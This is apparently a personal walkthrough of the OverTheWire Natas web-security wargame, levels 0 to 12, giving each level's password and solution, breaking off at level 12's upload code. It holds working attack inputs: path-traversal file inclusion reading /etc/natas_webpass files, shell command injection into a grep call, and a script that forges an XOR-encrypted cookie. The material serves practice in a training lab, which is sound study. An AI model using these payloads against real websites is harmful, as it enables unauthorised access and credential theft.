Level 0:

view-source:http://natas0.natas.labs.overthewire.org/
U: natas0
P: natas0

<div id="content">
You can find the password for the next level on this page.

<!--The password for natas1 is gtVrDuiDfck831PqWsLEZy5gyDz1clto -->
</div>
</body>
</html>

U: natas1
P: gtVrDuiDfck831PqWsLEZy5gyDz1clto

---
Natas Level 0 → Level 1

Username: natas1
URL:      http://natas1.natas.labs.overthewire.org
---
<div id="content">
You can find the password for the
next level on this page, but rightclicking has been blocked!

<!--The password for natas2 is ZluruAthQk7Q2MqmDeTiUij2ZvWy2mBi -->
</div>
</body>
</html>

--
natas2
ZluruAthQk7Q2MqmDeTiUij2ZvWy2mBi
---

Natas Level 1 → Level 2

Username: natas2
URL:      http://natas2.natas.labs.overthewire.org
---
Go to "files" folder.
http://natas2.natas.labs.overthewire.org/files/users.txt
# username:password
alice:BYNdCesZqW
bob:jw2ueICLvT
charlie:G5vCxkVV3m
natas3:sJIJNW6ucpu6HPZ1ZAchaDtwd7oGrD14
eve:zo4mJWyNj2
mallory:9urtcpzBmH

natas3
sJIJNW6ucpu6HPZ1ZAchaDtwd7oGrD14
---

Natas Level 2 → Level 3

Username: natas3
URL:      http://natas3.natas.labs.overthewire.org
sJIJNW6ucpu6HPZ1ZAchaDtwd7oGrD14
---

Check http://natas3.natas.labs.overthewire.org/robots.txt

User-agent: *
Disallow: /s3cr3t/

http://natas3.natas.labs.overthewire.org/s3cr3t/users.txt
natas4:Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ

natas4
Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ
---

Natas Level 3 → Level 4

Username: natas4
URL:      http://natas4.natas.labs.overthewire.org
Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ

First open:

Access disallowed. You are visiting from "http://natas4.natas.labs.overthewire.org/index.php" while authorized users should come only from "http://natas5.natas.labs.overthewire.org/"
URL : Refresh page (same page)

Open Burpsuite.
Click on refresh page.
Change referer to http://natas5.natas.labs.overthewire.org/
Forward.

Access granted. The password for natas5 is iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq

natas5
iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq

Done!
---

Natas Level 4 → Level 5

Username: natas5
URL:      http://natas5.natas.labs.overthewire.org
iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq

Access disallowed. You are not logged in.

Use Burpsuite.
Change cookie "loggedin" from 0 to 1.

Access granted. The password for natas6 is aGoY4q2Dc6MgDq4oL4YtoKtyAg9PeHa1

natas6
aGoY4q2Dc6MgDq4oL4YtoKtyAg9PeHa1

---

Natas Level 5 → Level 6

Username: natas6
URL:      http://natas6.natas.labs.overthewire.org

Asks to Input Secret + submit query. Link to view sourcecode.

First view sourcecode:
```
<?

include "includes/secret.inc";

    if(array_key_exists("submit", $_POST)) {
        if($secret == $_POST['secret']) {
        print "Access granted. The password for natas7 is <censored>";
    } else {
        print "Wrong secret";
    }
    }
?>
```

Go to view-source:http://natas6.natas.labs.overthewire.org/includes/secret.inc:
<?
$secret = "FOEIUWGHFEEUHOFUOIU";
?>

Submit secret:

Access granted. The password for natas7 is 7z3hEENjQtflzgnT29q7wAvMNfZdh0i9

natas7
7z3hEENjQtflzgnT29q7wAvMNfZdh0i9

Done!

---

Natas Level 6 → Level 7

Username: natas7
URL:      http://natas7.natas.labs.overthewire.org
7z3hEENjQtflzgnT29q7wAvMNfZdh0i9

Home, About links.

View Source: `view-source:http://natas7.natas.labs.overthewire.org/index.php?page=home`

<br>
this is the front page

<!-- hint: password for webuser natas8 is in /etc/natas_webpass/natas8 -->
</div>

Seems like it's LFI. If you use:

http://natas7.natas.labs.overthewire.org/index.php?page=../../../etc/natas_webpass/natas8

Output:
Warning: include(../../../etc/natas_webpass/natas8): failed to open stream: No such file or directory in /var/www/natas/natas7/index.php on line 21

Warning: include(): Failed opening '../../../etc/natas_webpass/natas8' for inclusion (include_path='.:/usr/share/php:/usr/share/pear') in /var/www/natas/natas7/index.php on line 21

Try: http://natas7.natas.labs.overthewire.org/index.php?page=../../../../../../etc/natas_webpass/natas8

Output:  DBfUBfqQG69KvJvJ1iAbMoIpwSNQ9bWe

natas8
DBfUBfqQG69KvJvJ1iAbMoIpwSNQ9bWe

Done!
---

Natas Level 7 → Level 8

Username: natas8
URL:      http://natas8.natas.labs.overthewire.org
DBfUBfqQG69KvJvJ1iAbMoIpwSNQ9bWe

Input Secret area.
View source code:

```
<?

$encodedSecret = "3d3d516343746d4d6d6c315669563362";

function encodeSecret($secret) {
    return bin2hex(strrev(base64_encode($secret)));
}

if(array_key_exists("submit", $_POST)) {
    if(encodeSecret($_POST['secret']) == $encodedSecret) {
    print "Access granted. The password for natas9 is <censored>";
    } else {
    print "Wrong secret";
    }
}
?>
```

We can just run the opposite:

<?php
   function decodeSecret($secret) {
    return base64_decode(strrev(hex2bin($secret)));

   }

print decodeSecret("3d3d516343746d4d6d6c315669563362");

?>

Output: https://www.tutorialspoint.com/execute_php_online.php

$php main.php

<html>
<head>
<title>Online PHP Script Execution</title>
</head>
<body>
oubWYf2kBq</body>
</html>

Secret: oubWYf2kBq

Output:
Access granted. The password for natas9 is W0mMhUcRRnG8dcghE4qvk3JA9lGt8nDl

natas9
W0mMhUcRRnG8dcghE4qvk3JA9lGt8nDl
---

Natas Level 8 → Level 9

Username: natas9
URL:      http://natas9.natas.labs.overthewire.org
W0mMhUcRRnG8dcghE4qvk3JA9lGt8nDl
---
Asks for finding words containing:" " and Search

View Source Code:

```
<pre>
<?
$key = "";

if(array_key_exists("needle", $_REQUEST)) {
    $key = $_REQUEST["needle"];
}

if($key != "") {
    passthru("grep -i $key dictionary.txt");
}
?>
</pre>
```
http://natas9.natas.labs.overthewire.org/?needle=needle%3B+cat+%2Fetc%2Fnatas_webpass%2Fnatas9%3B&submit=Search

If you type needle, it performs the passthru. So we can inject code into the search box, by typing the following:

`needle; cat /etc/natas_webpass/natas10; `

Output:

nOpp1igQAkUzaI1GUUjzn1bFVj7xCNzu

natas10
nOpp1igQAkUzaI1GUUjzn1bFVj7xCNzu

Done!
---

Natas Level 9 → Level 10

Username: natas10
URL:      http://natas10.natas.labs.overthewire.org
nOpp1igQAkUzaI1GUUjzn1bFVj7xCNzu
---

View Sourcecode:

```
<div id="content">

For security reasons, we now filter on certain characters<br/><br/>
<form>
Find words containing: <input name=needle><input type=submit name=submit value=Search><br><br>
</form>


Output:
<pre>
<?
$key = "";

if(array_key_exists("needle", $_REQUEST)) {
    $key = $_REQUEST["needle"];
}

if($key != "") {
    if(preg_match('/[;|&]/',$key)) {
        print "Input contains an illegal character!";
    } else {
        passthru("grep -i $key dictionary.txt");
    }
}
?>
</pre>

```
So now we can't use `;`, `|`, `&`.

http://natas10.natas.labs.overthewire.org/?needle=+u+%2Fetc%2Fnatas_webpass%2Fnatas11&submit=Search

So we type: `u /etc/natas_webpass/natas11`

Output:
Output:

/etc/natas_webpass/natas11:U82q5TCMMQ9xuFoI3dYX61s7OZD9JKoK
dictionary.txt:August
dictionary.txt:August's
dictionary.txt:Augusts
dictionary.txt:Celsius
...

natas11
U82q5TCMMQ9xuFoI3dYX61s7OZD9JKoK

---

Natas Level 10 → Level 11

Username: natas11
URL:      http://natas11.natas.labs.overthewire.org
U82q5TCMMQ9xuFoI3dYX61s7OZD9JKoK

---

View Sourcecode:

```
<?

$defaultdata = array( "showpassword"=>"no", "bgcolor"=>"#ffffff");

function xor_encrypt($in) {
    $key = '<censored>';
    $text = $in;
    $outText = '';

    // Iterate through each character
    for($i=0;$i<strlen($text);$i++) {
    $outText .= $text[$i] ^ $key[$i % strlen($key)];
    }

    return $outText;
}

function loadData($def) {
    global $_COOKIE;
    $mydata = $def;
    if(array_key_exists("data", $_COOKIE)) {
    $tempdata = json_decode(xor_encrypt(base64_decode($_COOKIE["data"])), true);
    if(is_array($tempdata) && array_key_exists("showpassword", $tempdata) && array_key_exists("bgcolor", $tempdata)) {
        if (preg_match('/^#(?:[a-f\d]{6})$/i', $tempdata['bgcolor'])) {
        $mydata['showpassword'] = $tempdata['showpassword'];
        $mydata['bgcolor'] = $tempdata['bgcolor'];
        }
    }
    }
    return $mydata;
}

function saveData($d) {
    setcookie("data", base64_encode(xor_encrypt(json_encode($d))));
}

$data = loadData($defaultdata);

if(array_key_exists("bgcolor",$_REQUEST)) {
    if (preg_match('/^#(?:[a-f\d]{6})$/i', $_REQUEST['bgcolor'])) {
        $data['bgcolor'] = $_REQUEST['bgcolor'];
    }
}

saveData($data);



?>

<h1>natas11</h1>
<div id="content">
<body style="background: <?=$data['bgcolor']?>;">
Cookies are protected with XOR encryption<br/><br/>

<?
if($data["showpassword"] == "yes") {
    print "The password for natas12 is <censored><br>";
}

?>

<form>
Background color: <input name=bgcolor value="<?=$data['bgcolor']?>">
<input type=submit value="Set color">
</form>

<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
</body>
</html>
```

Use burpsuite.
Found "data" cookie, value: ClVLIh4ASCsCBE8lAxMacFMZV2hdVVotEhhUJQNVAmhSFVooExVaaAw%3D

```
<?php
$defaultdata = json_encode(array( "showpassword"=>"yes", "bgcolor"=>"#ffffff"));
function xor_decrypt($in) {
  if ($in != ''){
  	$text = $in;
  	$key = json_encode(array( "showpassword"=>"no", "bgcolor"=>"#ffffff"));}
  else{
  	$text = json_encode(array( "showpassword"=>"yes", "bgcolor"=>"#ffffff"));
  	$key = "qw8J";}

  // Iterate through each character
  $outText = '';
  for($i=0;$i<strlen($text);$i++) {
    $outText .= $text[$i] ^ $key[$i % strlen($key)];
  }
return $outText;
}

print "Key is currently unknown.\n OriginalData ^ Key = CipherText\n\t";
print " so that also means,\n OriginalData ^ Ciphertext = Key\n Therefore the key will repeat itself: ";
print xor_decrypt(base64_decode("ClVLIh4ASCsCBE8lAxMacFMZV2hdVVotEhhUJQNVAmhSEV4sFxFeaAw="));
print "\nNow that we know the key lets create a new cookie to display the password: \n";
print base64_encode(xor_decrypt(""));
print "\n";
?>
```
New cookie: ClVLIh4ASCsCBE8lAxMacFMOXTlTWxooFhRXJh4FGnBTVF4sFxFeLFMK

Insert in Burpsuite

Output:
The password for natas12 is EDXp0pS26wLKHZy1rDBPUZk0RKfLGIR3

natas12
EDXp0pS26wLKHZy1rDBPUZk0RKfLGIR3

---

Natas Level 11 → Level 12

Username: natas12
URL:      http://natas12.natas.labs.overthewire.org
EDXp0pS26wLKHZy1rDBPUZk0RKfLGIR3

"Choose a JPEG to upload (max 1KB)"

```
<?

function genRandomString() {
    $length = 10;
    $characters = "0123456789abcdefghijklmnopqrstuvwxyz";
    $string = "";    

    for ($p = 0; $p < $length; $p++) {
        $string .= $characters[mt_rand(0, strlen($characters)-1)];
    }

    return $string;
}

function makeRandomPath($dir, $ext) {
    do {
    $path = $dir."/".genRandomString().".".$ext;
    } while(file_exists($path));
    return $path;
}

function makeRandomPathFromFilename($dir, $fn) {
    $ext = pathinfo($fn, PATHINFO_EXTENSION);
    return makeRandomPath($dir, $ext);
}

if(array_key_exists("filename", $_POST)) {
    $target_path = makeRandomPathFromFilename("upload", $_POST["filename"]);


        if(filesize($_FILES['uploadedfile']['tmp_name']) > 1000) {
        echo "File is too big";
    } else {
        if(move_uploaded_file($_FILES['uploadedfile']['tmp_name'], $target_path)) {
            echo "The file <a href=\"$target_path\">$target_path</a> has been uploaded";
        } else{
            echo "There was an error uploading the file, please try again!";
        }
    }
} else {
?>
```
